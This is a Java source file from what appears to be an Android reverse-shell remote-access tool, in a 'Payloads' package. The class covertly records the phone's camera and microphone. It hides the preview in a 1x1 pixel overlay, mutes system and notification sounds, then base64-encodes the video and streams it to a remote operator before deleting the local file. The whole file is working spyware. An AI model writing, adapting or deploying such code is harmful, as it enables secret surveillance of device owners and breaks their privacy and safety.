package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.OutputStream;


public class videoRecorder {

    Context context;
    Activity activity;
    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    static String TAG = "videoRecoderClass";

    File videoFile;
    static OutputStream outputStream;

    public videoRecorder(Context context,Activity activity) {
        this.context = context;
        this.activity = activity;
    }

    public void startVideo(final int cameraID, final OutputStream outputStream){
        this.outputStream = outputStream;
        File outputDir = context.getCacheDir();
        try {
            videoFile = File.createTempFile("sound", ".mp4", outputDir);
        } catch (IOException e) {
            e.printStackTrace();
        }

        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
                surfaceView = new SurfaceView(context);
                final WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                        1, 1,
                        WindowManager.LayoutParams.TYPE_TOAST,
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                        PixelFormat.TRANSLUCENT
                );
                layoutParams.gravity = Gravity.LEFT | Gravity.TOP;

                windowManager.addView(surfaceView, layoutParams);
                surfaceView.getHolder().addCallback(new SurfaceHolder.Callback() {
                    @Override
                    public void surfaceCreated(SurfaceHolder surfaceHolder) {

                        AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
                        audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
                        audioManager.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);
                        audioManager.setStreamVolume(AudioManager.STREAM_DTMF, 0, 0);
                        audioManager.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);
                        audioManager.setStreamVolume(AudioManager.STREAM_RING, 0, 0);

                        try{
                            camera = Camera.open(cameraID);
                        }catch (Exception e){
                            Log.d(TAG,"Error in opening camera");
                            e.printStackTrace();
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        outputStream.write("Failed to open camera\n".getBytes("UTF-8"));
                                    } catch (IOException ex) {
                                        ex.printStackTrace();
                                    }
                                }
                            }).start();
                            return;
                        }

                        Log.d(TAG,"camera ready");
                        mediaRecorder = new MediaRecorder();
                        camera.unlock();
                        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
                        mediaRecorder.setCamera(camera);
                        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
                        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
                        try {
                            mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_480P));
                        }catch (RuntimeException e){
                            e.printStackTrace();
                                new Thread(new Runnable() {
                                    @Override
                                    public void run() {
                                        try {
                                            outputStream.write("Error in Initialing Camera \n".getBytes("UTF-8"));
                                        } catch (IOException ex) {
                                            ex.printStackTrace();
                                        }
                                    }
                                }).start();
                                return;
                        }
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            mediaRecorder.setOutputFile(videoFile);
                        }else{
                            mediaRecorder.setOutputFile(videoFile.getAbsolutePath());
                        }

                        try { mediaRecorder.prepare(); } catch (Exception e) {}
                        mediaRecorder.start();
                        Log.d(TAG,"camera started");
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    try {
                                        outputStream.write("Started Recording Video\n".getBytes("UTF-8"));
                                    } catch (IOException e) {
                                        e.printStackTrace();
                                    }
                                }
                            }).start();
                    }

                    @Override
                    public void surfaceChanged(SurfaceHolder surfaceHolder, int i, int i1, int i2) { }

                    @Override
                    public void surfaceDestroyed(SurfaceHolder surfaceHolder) { }
                });
            }
        });
    }


    public void videoStop(final OutputStream outputStream){
        this.outputStream = outputStream;
        Log.d(TAG,"camera stop called");
        if(mediaRecorder!=null){
            try{
                mediaRecorder.stop();
            }catch (IllegalStateException e){
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            outputStream.write("Video Service Not Started.\n".getBytes("UTF-8"));
                            return;
                        } catch (IOException ex) {
                            ex.printStackTrace();
                        }
                    }
                }).start();
            }
        mediaRecorder.reset();
        mediaRecorder.release();
        camera.lock();
        camera.release();
        windowManager.removeView(surfaceView);

        if(videoFile.length()!=0 && videoFile.exists()){
            Log.d(TAG,"file exists");
            sendData(videoFile);
        }else{
            Log.d(TAG,"no error for getting audio");
            new Thread(new Runnable() {
                @Override
                public void run() {
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            try {
                                outputStream.write("Error in getting Video\n".getBytes("UTF-8"));
                                return;
                            } catch (IOException ex) {
                                ex.printStackTrace();
                            }
                        }
                    }).start();
                }
            }).start();
        }
        videoFile.delete();
        }else{
            Log.d(TAG,"no error for gq2123123123");
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write("Video Service Not Started.\n".getBytes("UTF-8"));
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        }
    }

    private static void sendData(File file) {
        if(file.length()>16000000){
            Log.d(TAG,"Scamm");
            try {
                outputStream.write("Large file cant transfer\nEND123\n".getBytes("UTF-8"));
            } catch (IOException e) {
                e.printStackTrace();
            }
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    outputStream.write("stopVideo123\n".getBytes("UTF-8"));
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
            }
        }).start();
        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            Log.d(TAG, String.valueOf(size));
            final String encodedVideo = Base64.encodeToString(data, Base64.DEFAULT);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        outputStream.write(encodedVideo.getBytes("UTF-8"));
                        outputStream.write("END123\n".getBytes("UTF-8"));
                    } catch (IOException ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        }catch (Exception e){
        }
    }
}
